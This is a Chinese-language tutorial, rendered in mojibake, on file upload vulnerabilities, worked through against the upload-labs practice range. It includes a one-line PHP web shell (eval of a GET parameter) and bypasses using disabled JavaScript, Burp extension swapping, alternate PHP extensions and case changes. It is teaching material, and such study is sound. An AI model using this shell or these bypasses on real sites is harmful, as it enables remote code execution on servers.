---
slug: /net-security/08/01
---

## æ¦‚å¿µ

æ–‡ä»¶ä¸Šä¼ æ˜¯å¸¸ç”¨åŠŸèƒ½ï¼Œä½†æ¶æ„æ–‡ä»¶çš„ä¸Šä¼ ä¼šå½¢æˆæ¼æ´ã€‚

ä¸»è¦å½¢æˆæ˜¯ï¼šåç«¯æ¥å—äº†æ¶æ„æ–‡ä»¶ä¸Šä¼ å¹¶ä¿å­˜ï¼Œå—å®³è€…è®¿é—®è¯¥æ¶æ„æ–‡ä»¶æ—¶ï¼Œå…¶ä¸­çš„æ¶æ„ä»£ç è¢« Web å®¹å™¨æ‰§è¡Œã€‚

<br />

å¸¸è§åœºæ™¯ï¼š

1. ä¸Šä¼ å¤´åƒ

2. ä¸Šä¼ ç›¸å†Œ

3. ä¸Šä¼ é™„ä»¶

4. æ·»åŠ æ–‡ç« å›¾ç‰‡

5. å‰å°ç•™è¨€èµ„æ–™ä¸Šä¼ 

6. ç¼–è¾‘å™¨æ–‡ä»¶ä¸Šä¼ 

7. ###### â€¦â€¦

<br />

å®‰è£…é¶åœº

```bash
docker pull cuer/upload-labs
docker run -d -p 8082:80 --name upload-labs cuer/upload-labs
```



## å®¢æˆ·ç«¯ - JS ç»•è¿‡

### ç¦ç”¨ JavaScript

æ‰“å¼€é¶åœºçš„ Pass-01ï¼Œç‚¹å‡»å³ä¸Šè§’ã€ŒæŸ¥çœ‹æºç ã€ï¼Œè¿™é‡Œçš„æ–‡ä»¶ä¸Šä¼ å­˜åœ¨ JS é™åˆ¶ï¼Œå¹¶ä¸”åªå…è®¸ `.jpg`, `.png`, `.gif`

```php
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!");
        return false;
    }
    //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹
    var allow_ext = ".jpg|.png|.gif";
    //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹
    var ext_name = file.substring(file.lastIndexOf("."));
    //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ 
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ " + allow_ext + "ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

åœ¨ä¸Šä¼ å‰å…ˆç¦ç”¨æ‰ JavaScript

![](http://img.wukaipeng.com/2023/1017-075949-image-20231017075948931.png)

é¦–å…ˆæˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ `info.php`ï¼Œå†…å®¹æ˜¯è¾“å‡º php ä¿¡æ¯ï¼š

```php
<?php phpinfo(); ?>
```

![](http://img.wukaipeng.com/2023/10/19-070309-image-20231019070309633.png)æˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸Šä¼  `get.php`ï¼Œç›´æ¥ç”¨å‚æ•°æ§åˆ¶è¾“å‡º

```php
<?php eval(@$_GET['cmd']); ?>
```

![](http://img.wukaipeng.com/2023/10/19-071303-image-20231019071303290.png)

### ä¿®æ”¹åç¼€å

å…ˆæŠŠ `get.php` ä¿®æ”¹ä¸ºç¬¦åˆä¸Šä¼ è¦æ±‚ ğŸ‘‰ `get.png`ï¼Œç„¶åç”¨ Burp æŠ“åŒ…æ”¹å›åŸæ¥çš„ `get.php`

![](http://img.wukaipeng.com/2023/10/19-071741-image-20231019071740872.png)



### ä¿®æ”¹å‰ç«¯ä»£ç 

åˆ é™¤ `onsubmit` æ–¹æ³•ï¼Œè¿™ç§æ–¹å¼ä»…åœ¨ FireFox ç”Ÿæ•ˆï¼š

![](http://img.wukaipeng.com/2023/10/19-072230-image-20231019072230409.png)

## æœåŠ¡ç«¯ - é»‘åå•ç»•è¿‡

### ç‰¹æ®Šåç¼€

ä½¿ç”¨ Pass-03ï¼Œè¿™é‡Œåç«¯æ— æ³•ä¸Šä¼ çš„é»‘åå•åŒ…æ‹¬ `.asp`, `.aspx`, `.php`, `.jsp`ã€‚



```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
```

å¯ä»¥ä½¿ç”¨å…¶ä»–åç¼€ï¼Œæ¯”å¦‚ï¼š`.phtml`, `.phps`, `php5`, `.pht`

> è¿™äº›åç¼€æ–‡ä»¶éœ€è¦è¢«æ‰§è¡Œçš„è¯æœ‰å‰ææ¡ä»¶æ˜¯ï¼Œ Apache éœ€è¦åšä¸€äº›é…ç½®ä»£ç 

### å¤§å°å†™ç»•è¿‡

ä½¿ç”¨ Pass-06ï¼Œä¸Šä¼  `get.PHP` å°±èƒ½ç»•è¿‡

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
```































